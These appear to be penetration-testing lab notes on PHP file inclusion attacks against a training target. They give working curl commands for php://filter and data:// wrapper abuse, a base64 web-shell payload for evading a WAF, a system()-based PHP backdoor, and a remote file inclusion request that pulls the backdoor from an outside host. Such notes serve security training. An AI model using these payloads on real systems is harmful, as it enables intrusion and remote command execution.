# Additional Attacks

## PHP Wrappers

### `php://filter`

If you see a page that doesn't include a closing `<body>` tag for reasons such as it being under maintenance, we can still pull the full page with the following modification

Given the original request

```bash
curl http://mountaindesserts.com/meteor/index.php?page=admin.php
```

We can modify it to the following

```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

We can then decode the output to view the entire page even if it was originally cutoff

### `data://`

We can exploit LFI with the `data://` wrapper via the following modification

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

In the situation where we also need to circumvent a WAF, we can also base64 encode it

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

## RFI

We begin by hosting the following `simple-backdoor.php` file on a simple python http server

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

We can then exploit the RFI via the following request

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```